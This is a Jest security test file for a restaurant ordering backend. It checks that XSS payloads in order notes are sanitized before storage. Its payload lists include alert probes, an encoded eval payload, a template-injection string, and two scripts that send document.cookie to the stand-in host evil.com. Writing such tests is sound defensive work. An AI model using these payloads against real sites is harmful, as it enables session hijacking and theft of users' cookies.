/**
 * Security Tests: XSS Prevention
 * 
 * Feature: digital-menu-and-delivery
 * Task: 34.4 - Test de XSS
 * 
 * Tests:
 * 1. Agregar scripts en notas de pedido
 * 2. Verificar que se saniticen antes de guardar
 * 3. Verificar que se escapen al mostrar
 */

const db = require('../../db');
const OrderProcessorService = require('../../services/OrderProcessorService');
const AutoCommandService = require('../../services/AutoCommandService');
const PrintService = require('../../services/PrintService');

jest.mock('../../services/PrintService');

describe('Security 34.4: XSS Prevention', () => {
    let orderProcessor;
    let restauranteId;
    let mesaId;
    let productoId;
    let categoriaId;

    beforeAll(async () => {
        PrintService.mockImplementation(() => ({
            printCommand: jest.fn().mockResolvedValue({ success: true }),
            setRetryQueue: jest.fn(),
            getPrinterConfig: jest.fn().mockResolvedValue({ nombre_negocio: 'Test', printer_type: 'escpos', ancho_papel: 80 })
        }));

        const printService = new PrintService();
        const autoCommandService = new AutoCommandService(printService);
        orderProcessor = new OrderProcessorService(autoCommandService, null);

        // Ensure required ENUM values
        try {
            await db.query(`
                ALTER TABLE pedidos 
                MODIFY COLUMN estado ENUM('abierto','activo','en_cocina','preparando','listo','servido','cerrado','cancelado','pendiente','confirmado','en_preparacion','en_camino','entregado') DEFAULT 'abierto'
            `);
        } catch (e) { /* already modified */ }

        // Create test tenant
        const slug = `test-xss-${Date.now()}-${Math.random().toString(36).substring(7)}`;
        const [tenantResult] = await db.query(
            'INSERT INTO restaurantes (nombre, slug, estado) VALUES (?, ?, ?)',
            ['Test XSS Prevention', slug, 'activo']
        );
        restauranteId = tenantResult.insertId;

        // Create configuracion_impresion
        try {
            await db.query('INSERT INTO configuracion_impresion (restaurante_id, nombre_negocio) VALUES (?, ?)', [restauranteId, 'Test XSS']);
        } catch (e) {}

        // Create test mesa
        const [mesaResult] = await db.query(
            'INSERT INTO mesas (restaurante_id, numero, estado) VALUES (?, ?, ?)',
            [restauranteId, 'XSS-1', 'disponible']
        );
        mesaId = mesaResult.insertId;

        // Create test category
        const [catResult] = await db.query(
            'INSERT INTO categorias (restaurante_id, nombre) VALUES (?, ?)',
            [restauranteId, 'Cat XSS']
        );
        categoriaId = catResult.insertId;

        // Create test product
        const [prodResult] = await db.query(
            'INSERT INTO productos (restaurante_id, categoria_id, nombre, codigo, precio_unidad, precio_kg, precio_libra, activo) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
            [restauranteId, categoriaId, 'Producto XSS', `XSS-${Date.now()}`, 10000, 20000, 10000, true]
        );
        productoId = prodResult.insertId;
    });

    afterAll(async () => {
        await db.query('DELETE FROM pedido_items WHERE pedido_id IN (SELECT id FROM pedidos WHERE restaurante_id = ?)', [restauranteId]);
        await db.query('DELETE FROM pedidos WHERE restaurante_id = ?', [restauranteId]);
        await db.query('DELETE FROM productos WHERE restaurante_id = ?', [restauranteId]);
        await db.query('DELETE FROM categorias WHERE restaurante_id = ?', [restauranteId]);
        try { await db.query('DELETE FROM configuracion_impresion WHERE restaurante_id = ?', [restauranteId]); } catch (e) {}
        await db.query('DELETE FROM mesas WHERE restaurante_id = ?', [restauranteId]);
        await db.query('DELETE FROM restaurantes WHERE id = ?', [restauranteId]);
        await db.end();
    });

    describe('XSS in order item notes', () => {
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert("XSS")>',
            '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
            '<input onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>',
            '<a href="javascript:alert(1)">click</a>'
        ];

        xssPayloads.forEach((payload, index) => {
            it(`should sanitize XSS payload #${index + 1} in item nota`, async () => {
                const orderData = {
                    mesaId,
                    restauranteId,
                    items: [
                        { producto_id: productoId, cantidad: 1, unidad_medida: 'UND', nota: payload }
                    ],
                    notas: null
                };

                // The order should succeed because sanitization cleans the input
                const result = await orderProcessor.createOrderFromDigitalMenu(orderData);
                expect(result.pedidoId).toBeDefined();

                // Verify the stored note was sanitized
                const [items] = await db.query(
                    'SELECT nota FROM pedido_items WHERE pedido_id = ?',
                    [result.pedidoId]
                );

                const storedNote = items[0].nota;
                if (storedNote) {
                    // The stored note should NOT contain executable script tags
                    expect(storedNote).not.toContain('<script>');
                    expect(storedNote).not.toContain('onerror=');
                    expect(storedNote).not.toContain('onload=');
                    expect(storedNote).not.toContain('javascript:');
                    expect(storedNote).not.toContain('<iframe');
                    expect(storedNote).not.toContain('onfocus=');
                    expect(storedNote).not.toContain('onstart=');
                }
            });
        });
    });

    describe('XSS in order general notes', () => {
        const xssPayloads = [
            '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
            '<img src="" onerror="eval(atob(\'YWxlcnQoMSk=\'))">',
            '{{constructor.constructor("alert(1)")()}}'
        ];

        xssPayloads.forEach((payload, index) => {
            it(`should sanitize XSS payload #${index + 1} in order notas`, async () => {
                const orderData = {
                    mesaId,
                    restauranteId,
                    items: [
                        { producto_id: productoId, cantidad: 1, unidad_medida: 'UND', nota: null }
                    ],
                    notas: payload
                };

                // The order should succeed because sanitization cleans the input
                const result = await orderProcessor.createOrderFromDigitalMenu(orderData);
                expect(result.pedidoId).toBeDefined();

                const [pedidos] = await db.query(
                    'SELECT notas FROM pedidos WHERE id = ?',
                    [result.pedidoId]
                );

                const storedNotes = pedidos[0].notas;
                if (storedNotes) {
                    expect(storedNotes).not.toContain('<script>');
                    expect(storedNotes).not.toContain('onerror=');
                    expect(storedNotes).not.toContain('javascript:');
                }
            });
        });
    });

    describe('XSS in unidad_medida field', () => {
        it('should reject invalid unidad_medida values', async () => {
            const orderData = {
                mesaId,
                restauranteId,
                items: [
                    { producto_id: productoId, cantidad: 1, unidad_medida: '<script>alert(1)</script>', nota: null }
                ],
                notas: null
            };

            await expect(
                orderProcessor.createOrderFromDigitalMenu(orderData)
            ).rejects.toThrow(/Unidad de medida inválida/);
        });

        it('should only accept valid unidad_medida values (UND, KG, LB)', async () => {
            const validUnits = ['UND', 'KG', 'LB'];

            for (const unit of validUnits) {
                const orderData = {
                    mesaId,
                    restauranteId,
                    items: [
                        { producto_id: productoId, cantidad: 1, unidad_medida: unit, nota: null }
                    ],
                    notas: null
                };

                const result = await orderProcessor.createOrderFromDigitalMenu(orderData);
                expect(result.pedidoId).toBeDefined();
            }
        });
    });

    describe('Legitimate notes should still work', () => {
        it('should accept normal text notes without issues', async () => {
            const normalNotes = [
                'Sin cebolla por favor',
                'Término medio',
                'Extra queso y salsa',
                'Para llevar',
                'Alérgico a maní - IMPORTANTE',
                'Mesa 5, cumpleaños'
            ];

            for (const note of normalNotes) {
                const orderData = {
                    mesaId,
                    restauranteId,
                    items: [
                        { producto_id: productoId, cantidad: 1, unidad_medida: 'UND', nota: note }
                    ],
                    notas: null
                };

                const result = await orderProcessor.createOrderFromDigitalMenu(orderData);
                expect(result.pedidoId).toBeDefined();

                const [items] = await db.query(
                    'SELECT nota FROM pedido_items WHERE pedido_id = ?',
                    [result.pedidoId]
                );
                // Normal notes should be stored as-is
                expect(items[0].nota).toBe(note);
            }
        });
    });
});
